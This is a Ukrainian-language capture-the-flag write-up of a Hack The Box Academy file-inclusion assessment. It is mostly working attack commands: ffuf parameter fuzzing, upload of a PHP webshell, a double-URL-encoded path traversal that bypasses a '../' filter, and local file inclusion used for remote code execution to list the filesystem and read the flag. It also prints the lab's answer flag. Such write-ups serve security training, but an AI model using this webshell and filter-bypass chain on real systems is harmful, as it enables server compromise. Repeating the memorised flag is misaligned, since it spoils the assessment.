## LFI — Skills Assessment: File Inclusion → RCE

**Модуль:** [File Inclusion](https://academy.hackthebox.com/app/module/23)
**Секція:** [Skills Assessment](https://academy.hackthebox.com/app/module/23/section/513)
**Ціль:** `154.57.164.62:30490`
**Прапор:** `eedbb78d4800aa45573840ed6bd2d1e3`

***

## Концепція

Комбінована атака з трьох технік:
1. **Parameter fuzzing** → знайти прихований GET-параметр (`?region=` на `contact.php`)
2. **File upload** → завантажити PHP webshell через `/api/application.php`
3. **Double URL encoding bypass** → `%252E%252E%252F` замість `../` щоб обійти фільтр
4. **LFI via region** → включити shell через upload path → RCE

***

## Крок 1 — Фаззинг параметрів

```bash
export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin
TARGET="http://154.57.164.62:30490"

# Baseline
BASELINE=$(curl -s "$TARGET/contact.php" | wc -c)

ffuf -w /usr/share/seclists/Discovery/Web-Content/burp-parameter-names.txt:FUZZ \
  -u "$TARGET/contact.php?FUZZ=value" \
  -fs $BASELINE -t 40
# Знайдено: region
```

***

## Крок 2 — Підготовка та завантаження webshell

```bash
echo '<?php system($_GET["cmd"]); ?>' > /tmp/shell.php

# Upload — сервер зберігає файл як md5(вміст файлу)
curl -s -X POST "$TARGET/api/application.php" \
  -F "firstName=test" \
  -F "lastName=test" \
  -F "email=pwn@test.com" \
  -F "file=@/tmp/shell.php;type=application/octet-stream" \
  -F "notes=test"

# Обчислюємо hash — це буде ім'я файлу на сервері
HASH=$(md5sum /tmp/shell.php | cut -d ' ' -f1)
echo "HASH: $HASH"
# HASH: fc023fcacb27a7ad72d605c4e300b389
```

> Сервер зберігає файл як `md5(вміст)` без розширення у `/uploads/`.

***

## Крок 3 — Double URL Encoding bypass

Фільтр блокує `../` і `%2e%2e%2f` (single encoding). Double encoding обходить:

```
../  →  %2e%2e%2f  →  %252e%252e%252f
```

```bash
# Верифікація RCE
curl -s "$TARGET/contact.php?region=%252E%252E%252Fuploads%252F${HASH}&cmd=id" \
  | grep -o 'uid=[^ <]*'
# uid=33(www-data)
```

***

## Крок 4 — Пошук прапора

```bash
# Список файлів у /
curl -s "$TARGET/contact.php?region=%252E%252E%252Fuploads%252F${HASH}&cmd=ls%20/" \
  | grep -v "^$\|<\|html\|DOCTYPE"
# flag_09ebca.txt  ← цільовий файл
```

***

## Крок 5 — Читаємо прапор

```bash
curl -s "$TARGET/contact.php?region=%252E%252E%252Fuploads%252F${HASH}&cmd=cat%20/flag_09ebca.txt" \
  | sed 's/<[^>]*>//g' | grep -v "^[[:space:]]*$" | grep -v "sumace\|Contact\|Apply\|Home\|Gmbh\|Wien\|call"
# eedbb78d4800aa45573840ed6bd2d1e3
```

***

## Повний ланцюг атаки

```
[ffuf parameter fuzzing] → contact.php?region= знайдено
        ↓
[Upload shell.php] → /api/application.php → збережено як md5(content)
        ↓
[HASH = md5sum shell.php] → fc023fcacb27a7ad72d605c4e300b389
        ↓
[Double encoding] → %252E%252E%252Fuploads%252FHASH → обходить ../  фільтр
        ↓
[LFI + RCE] → ?region=%252E%252E%252Fuploads%252FHASH&cmd=id
        ↓
[ls /] → flag_09ebca.txt → cat → eedbb78d4800aa45573840ed6bd2d1e3
```

***

## Чому Double Encoding

| Payload | Що бачить фільтр | Що виконує PHP |
|---|---|---|
| `../uploads/shell` | `../` — блокує | — |
| `%2e%2e%2fuploads/shell` | `../` після decode — блокує | — |
| `%252e%252e%252fuploads/shell` | `%2e%2e%2f` — не розпізнає | `../uploads/shell` ✅ |

***

## Прапор

```
eedbb78d4800aa45573840ed6bd2d1e3
```
